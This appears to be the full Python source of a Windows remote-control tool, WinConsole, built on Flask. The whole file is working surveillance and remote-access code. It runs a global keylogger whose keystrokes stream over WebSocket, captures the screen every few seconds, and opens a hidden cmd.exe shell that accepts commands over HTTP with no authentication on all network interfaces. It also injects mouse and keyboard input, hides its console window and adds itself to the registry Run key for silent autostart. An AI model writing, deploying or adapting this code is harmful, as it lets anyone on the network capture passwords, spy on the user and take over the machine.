import os
import sys
import json
import time
import threading
import subprocess
import io
import atexit
import ctypes
import webbrowser
import logging
from datetime import datetime
from pathlib import Path

from flask import Flask, render_template, jsonify, request, send_file
from flask_sock import Sock
import psutil
from PIL import Image, ImageGrab, ImageDraw

import pyautogui
pyautogui.FAILSAFE = False

try:
    from pynput import keyboard as pynput_kb
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import pystray
    HAS_TRAY = True
except ImportError:
    HAS_TRAY = False

# ── Config ──────────────────────────────────────────────────
HOST = os.environ.get('WINC_HOST', '0.0.0.0')
PORT = int(os.environ.get('WINC_PORT', '9081'))
SCREENSHOT_INTERVAL = int(os.environ.get('WINC_INTERVAL', '3'))
JPEG_QUALITY = 70
KEYLOG_MAX = 500

# ── Global state ────────────────────────────────────────────
latest_screenshot = None
screenshot_lock = threading.Lock()
screenshot_stop = threading.Event()

keylog_buffer = []
keylog_lock = threading.Lock()
_keylog_ws_clients = set()
_keylog_ws_lock = threading.Lock()

commands = {}
commands_lock = threading.Lock()
next_cmd_id = 0

# ── Template path (PyInstaller compat) ──────────────────────
def get_template_dir():
    if getattr(sys, 'frozen', False):
        return os.path.join(sys._MEIPASS, 'templates')
    return os.path.join(os.path.dirname(__file__), 'templates')

# ── Screenshot ──────────────────────────────────────────────
def capture_screenshot():
    global latest_screenshot
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=JPEG_QUALITY)
        buf.seek(0)
        with screenshot_lock:
            latest_screenshot = buf.getvalue()
        return True
    except Exception as e:
        log(f"Screenshot failed: {e}")
        return False

def screenshot_worker():
    while not screenshot_stop.is_set():
        capture_screenshot()
        screenshot_stop.wait(SCREENSHOT_INTERVAL)

# ── Process list ────────────────────────────────────────────
def get_process_list(sort_by='cpu', limit=50):
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status', 'create_time']):
        try:
            info = proc.info
            info['cpu_percent'] = info['cpu_percent'] or 0.0
            info['memory_percent'] = info['memory_percent'] or 0.0
            info['create_time'] = datetime.fromtimestamp(info['create_time']).isoformat() if info['create_time'] else ''
            procs.append(info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    if sort_by == 'cpu':
        procs.sort(key=lambda x: x['cpu_percent'], reverse=True)
    elif sort_by == 'memory':
        procs.sort(key=lambda x: x['memory_percent'], reverse=True)
    elif sort_by == 'name':
        procs.sort(key=lambda x: x['name'].lower() if x['name'] else '')
    elif sort_by == 'pid':
        procs.sort(key=lambda x: x['pid'])
    return procs[:limit]

# ── Persistent terminal ────────────────────────────────────
class PersistentTerminal:
    def __init__(self):
        self.proc = subprocess.Popen(
            ['cmd.exe'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True, bufsize=1, errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        self._lock = threading.Lock()
        self._buf = []
        self._ready = threading.Event()
        self._current_id = None
        self._history = {}
        self._ws_clients = set()
        self._ws_lock = threading.Lock()
        self._live_history = []
        self._initial_output = []
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader_started = threading.Event()
        self._reader.start()
        self._reader_started.wait()
        self.cwd = os.getcwd()
        self._init_shell()

    def _write(self, text):
        self.proc.stdin.write(text)
        self.proc.stdin.flush()

    def _init_shell(self):
        import time
        self._write('@echo off\n')
        time.sleep(0.5)
        with self._lock:
            self._initial_output = [l for l in self._live_history
                                    if '@echo off' not in l.rstrip('\r\n')]
            self._live_history.clear()

    def _read_loop(self):
        self._reader_started.set()
        for line in iter(self.proc.stdout.readline, ''):
            stripped = line.rstrip('\r\n')
            with self._lock:
                marker = f'##WINC_END({self._current_id})##'
                if stripped == marker:
                    self._history[self._current_id] = ''.join(self._buf)
                    self._buf.clear()
                    self._current_id = None
                    self._ready.set()
                elif self._current_id is not None:
                    self._buf.append(line)
                self._live_history.append(line)
                if len(self._live_history) > 1000:
                    self._live_history[:500] = []

            # Forward to WebSocket clients (filter end markers)
            if '##WINC_END' not in stripped:
                with self._ws_lock:
                    dead = []
                    for ws in self._ws_clients:
                        try:
                            ws.send(line)
                        except:
                            dead.append(ws)
                    for ws in dead:
                        self._ws_clients.discard(ws)

    def send(self, command, cmd_id, timeout=60):
        self._ready.clear()
        with self._lock:
            self._buf.clear()
            self._current_id = cmd_id
            self._write(command + '\n')
            self._write(f'echo ##WINC_END({cmd_id})##\n')

    def wait_done(self, cmd_id, timeout=60):
        self._ready.wait(timeout=timeout)

    def get_output(self, cmd_id):
        with self._lock:
            if cmd_id in self._history:
                return self._history[cmd_id], False
            if self._current_id == cmd_id:
                return ''.join(self._buf), True
        return '', False

    def write_input(self, text):
        with self._lock:
            self._write(text + '\n')

    def write_raw(self, text):
        # xterm sends \r for Enter; text mode needs \n to become \r\n
        self.proc.stdin.write(text.replace('\r', '\n'))
        self.proc.stdin.flush()

    def register_ws(self, ws):
        with self._ws_lock:
            self._ws_clients.add(ws)
        # Send initial prompt/banner to the new WS client
        for line in self._initial_output:
            try:
                ws.send(line)
            except:
                break

    def unregister_ws(self, ws):
        with self._ws_lock:
            self._ws_clients.discard(ws)

    def kill(self):
        try:
            self.proc.kill()
        except:
            pass


terminal = None

def get_terminal():
    global terminal
    if terminal is None or terminal.proc.poll() is not None:
        terminal = PersistentTerminal()
    return terminal

# ── Keyboard hook ───────────────────────────────────────────
keyboard_listener = None

NUMPAD_MAP = {
    '96': '0', '97': '1', '98': '2', '99': '3', '100': '4',
    '101': '5', '102': '6', '103': '7', '104': '8', '105': '9',
    '106': '*', '107': '+', '108': ',', '109': '-', '110': '.', '111': '/'
}

_last_kb = {'key': None, 't': 0.0}

def on_key_press(key):
    global _last_kb
    try:
        now = time.time()
        if hasattr(key, 'char') and key.char is not None:
            text = key.char
        else:
            name = getattr(key, 'name', str(key))
            text = NUMPAD_MAP.get(name, f'[{name}]')

        # Dedup: same key within 30ms → hardware repeat, skip
        if text == _last_kb['key'] and (now - _last_kb['t']) < 0.03:
            return
        _last_kb = {'key': text, 't': now}

        entry = {'time': datetime.now().isoformat(), 'key': text}
        with keylog_lock:
            keylog_buffer.append(entry)
            if len(keylog_buffer) > KEYLOG_MAX:
                keylog_buffer[:] = keylog_buffer[-KEYLOG_MAX:]
        # Broadcast to keylog WebSocket clients
        with _keylog_ws_lock:
            dead = []
            for ws in _keylog_ws_clients:
                try:
                    ws.send(json.dumps(entry))
                except:
                    dead.append(ws)
            for ws in dead:
                _keylog_ws_clients.discard(ws)
    except Exception:
        pass

def start_keyboard_hook():
    global keyboard_listener
    if not PYNPUT_AVAILABLE:
        return
    try:
        keyboard_listener = pynput_kb.Listener(on_press=on_key_press)
        keyboard_listener.daemon = True
        keyboard_listener.start()
    except Exception as e:
        log(f"Keyboard hook failed: {e}")

# ── Flask app ───────────────────────────────────────────────
app = Flask(__name__, template_folder=get_template_dir())
sock = Sock(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/screenshot')
def api_screenshot():
    trigger = request.args.get('trigger', '0') == '1'
    capture = request.args.get('capture', '0') == '1'
    if trigger or capture:
        capture_screenshot()
    with screenshot_lock:
        if latest_screenshot:
            return send_file(io.BytesIO(latest_screenshot), mimetype='image/jpeg', max_age=0)
    return jsonify({'error': 'No screenshot yet'}), 404

@app.route('/api/screenshot/config', methods=['GET', 'POST'])
def api_screenshot_config():
    global SCREENSHOT_INTERVAL
    if request.method == 'POST':
        data = request.get_json()
        if data and 'interval' in data:
            new_val = max(1, int(data['interval']))
            SCREENSHOT_INTERVAL = new_val
    return jsonify({'interval': SCREENSHOT_INTERVAL, 'quality': JPEG_QUALITY})

@app.route('/api/processes')
def api_processes():
    sort = request.args.get('sort', 'cpu')
    limit = min(int(request.args.get('limit', 100)), 500)
    try:
        return jsonify({'processes': get_process_list(sort, limit)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/processes/<int:pid>/kill', methods=['POST'])
def api_process_kill(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        return jsonify({'status': 'terminated'})
    except psutil.NoSuchProcess:
        return jsonify({'error': 'Process not found'}), 404
    except psutil.AccessDenied:
        return jsonify({'error': 'Access denied'}), 403

# ── Command execution endpoints ─────────────────────────────
@app.route('/api/exec', methods=['POST'])
def api_exec_start():
    global next_cmd_id
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({'error': 'No command'}), 400
    cmd = data['command']
    cmd_id = next_cmd_id
    next_cmd_id += 1
    try:
        term = get_terminal()
        term.send(cmd, cmd_id)
        # Wait for completion in background
        threading.Thread(target=lambda: term.wait_done(cmd_id), daemon=True).start()
        return jsonify({'id': cmd_id, 'status': 'started'})
    except Exception as e:
        log(f"Exec failed: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/exec/<int:cmd_id>')
def api_exec_status(cmd_id):
    try:
        term = get_terminal()
        output, running = term.get_output(cmd_id)
        return jsonify({
            'id': cmd_id, 'output': output,
            'running': running, 'returncode': None if running else 0
        })
    except Exception:
        return jsonify({'error': 'Not found'}), 404

@app.route('/api/exec/<int:cmd_id>/stop', methods=['POST'])
def api_exec_stop(cmd_id):
    try:
        get_terminal().kill()
        global terminal
        terminal = None
        return jsonify({'status': 'stopped'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/exec/<int:cmd_id>/stdin', methods=['POST'])
def api_exec_stdin(cmd_id):
    data = request.get_json()
    if data and 'input' in data:
        try:
            get_terminal().write_input(data['input'])
            return jsonify({'status': 'ok'})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    return jsonify({'error': 'No input'}), 400

@sock.route('/terminal/ws')
def terminal_ws(ws):
    term = get_terminal()
    term.register_ws(ws)
    try:
        while True:
            data = ws.receive()
            if data is None:
                break
            term.write_raw(data)
    finally:
        term.unregister_ws(ws)

@app.route('/api/terminal/cwd')
def api_terminal_cwd():
    return jsonify({'cwd': get_terminal().cwd})

@sock.route('/keylog/ws')
def keylog_ws(ws):
    with _keylog_ws_lock:
        _keylog_ws_clients.add(ws)
    try:
        while True:
            data = ws.receive()
            if data is None:
                break
    finally:
        with _keylog_ws_lock:
            _keylog_ws_clients.discard(ws)

# ── Mouse control ───────────────────────────────────────────
@app.route('/api/mouse', methods=['POST'])
def api_mouse():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400
    action = data.get('action', 'move')
    x = data.get('x')
    y = data.get('y')
    try:
        screen_w, screen_h = pyautogui.size()
        if action == 'move':
            if x is not None and y is not None:
                pyautogui.moveTo(max(0, min(x, screen_w)), max(0, min(y, screen_h)))
        elif action == 'click':
            btn = data.get('button', 'left')
            if x is not None and y is not None:
                pyautogui.click(max(0, min(x, screen_w)), max(0, min(y, screen_h)), button=btn)
            else:
                pyautogui.click(button=btn)
        elif action == 'doubleClick':
            if x is not None and y is not None:
                pyautogui.doubleClick(max(0, min(x, screen_w)), max(0, min(y, screen_h)))
            else:
                pyautogui.doubleClick()
        elif action == 'rightClick':
            if x is not None and y is not None:
                pyautogui.rightClick(max(0, min(x, screen_w)), max(0, min(y, screen_h)))
            else:
                pyautogui.rightClick()
        elif action == 'scroll':
            clicks = data.get('clicks', -1)
            pyautogui.scroll(clicks)
        elif action == 'drag':
            if x is not None and y is not None:
                pyautogui.drag(max(0, min(x, screen_w)), max(0, min(y, screen_h)))
        elif action == 'getPos':
            return jsonify({'x': pyautogui.position().x, 'y': pyautogui.position().y})
        else:
            return jsonify({'error': f'Unknown action: {action}'}), 400
        return jsonify({'status': 'ok', 'action': action})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ── Keyboard control ────────────────────────────────────────
@app.route('/api/keyboard', methods=['POST'])
def api_keyboard():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400
    action = data.get('action', 'type')
    try:
        if action == 'type':
            text = data.get('text', '')
            pyautogui.write(text, interval=data.get('interval', 0.0))
        elif action == 'press':
            key = data.get('key', '')
            pyautogui.press(key)
        elif action == 'hotkey':
            keys = data.get('keys', [])
            if keys:
                pyautogui.hotkey(*keys)
        else:
            return jsonify({'error': f'Unknown action: {action}'}), 400
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ── Keylog ──────────────────────────────────────────────────
@app.route('/api/keylog')
def api_keylog():
    since = request.args.get('since')
    with keylog_lock:
        if since:
            result = [e for e in keylog_buffer if e['time'] > since]
        else:
            result = list(keylog_buffer[-200:])
    return jsonify({'entries': result})

@app.route('/api/keylog/clear', methods=['POST'])
def api_keylog_clear():
    with keylog_lock:
        keylog_buffer.clear()
    return jsonify({'status': 'cleared'})

# ── Cleanup on exit ─────────────────────────────────────────
def cleanup():
    screenshot_stop.set()
    global terminal
    if terminal:
        terminal.kill()

atexit.register(cleanup)

# ── Logging ──────────────────────────────────────────────────
LOG_DIR = Path(os.environ.get('WINC_LOG_DIR', Path.home() / '.winconsole'))
LOG_FILE = LOG_DIR / 'winconsole.log'

def setup_logging():
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    logging.basicConfig(
        filename=str(LOG_FILE),
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        encoding='utf-8'
    )
    # Also write startup messages to log
    sys.stderr = open(str(LOG_DIR / 'errors.log'), 'a', encoding='utf-8')

def log(msg):
    logging.info(msg)

# ── Windows startup helpers ─────────────────────────────────
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "WinConsole"

def install_startup():
    """Add to HKCU Run registry key for autostart on boot (silent)."""
    import winreg
    exe_path = sys.executable if not getattr(sys, 'frozen', False) else sys.argv[0]
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        log(f"Install startup failed: {e}")

def uninstall_startup():
    """Remove from HKCU Run registry key (silent)."""
    import winreg
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_NAME)
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass
    except Exception as e:
        log(f"Uninstall startup failed: {e}")

# ── Single instance ──────────────────────────────────────────
MUTEX_NAME = "Global\\WinConsole-{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}"
_app_mutex = None

def check_single_instance():
    global _app_mutex
    _app_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        ctypes.windll.kernel32.CloseHandle(_app_mutex)
        sys.exit(0)

# ── Tray icon ────────────────────────────────────────────────
def create_tray_image():
    size = 64
    img = Image.new('RGBA', (size, size), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.rounded_rectangle([2, 2, size-3, size-3], radius=14, fill='#7aa2f7')
    w = 5
    pts = [(size//2-3*w, 16), (size//2-w, 16), (size//2, 26),
           (size//2+w, 16), (size//2+3*w, 16),
           (size//2+2*w, 48), (size//2, 32), (size//2-2*w, 48)]
    draw.polygon(pts, fill='white')
    return img

def on_tray_open():
    webbrowser.open(f'http://127.0.0.1:{PORT}')

def on_tray_exit(icon):
    icon.stop()
    cleanup()
    os._exit(0)

def setup_tray():
    if not HAS_TRAY:
        return None
    try:
        menu = pystray.Menu(
            pystray.MenuItem("打开浏览器", lambda: on_tray_open(), default=True),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("退出", lambda icon: on_tray_exit(icon))
        )
        icon = pystray.Icon("WinConsole", create_tray_image(), "WinConsole - 运行中", menu)
        return icon
    except Exception as e:
        log(f"Tray icon setup failed: {e}")
        return None

# ── Console & startup ───────────────────────────────────────
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

# ── Entry point ─────────────────────────────────────────────
def main():
    check_single_instance()

    args = sys.argv[1:]
    if '--install' in args:
        install_startup()
        return
    if '--uninstall' in args:
        uninstall_startup()
        return
    if '--port' in args:
        idx = args.index('--port') + 1
        if idx < len(args):
            global PORT
            PORT = int(args[idx])

    setup_logging()
    log(f"WinConsole starting on {HOST}:{PORT}")

    if getattr(sys, 'frozen', False):
        hide_console()

    # Background services
    threading.Thread(target=screenshot_worker, daemon=True).start()
    capture_screenshot()
    start_keyboard_hook()

    # Start Flask in background thread
    def run_flask():
        app.run(host=HOST, port=PORT, threaded=True, debug=False)
    threading.Thread(target=run_flask, daemon=True).start()

    # (no auto-open)

    # Tray icon (blocking, message loop in main thread)
    icon = setup_tray()
    if icon:
        icon.run()
    else:
        # Fallback: keep main thread alive
        while True:
            time.sleep(1)

if __name__ == '__main__':
    main()
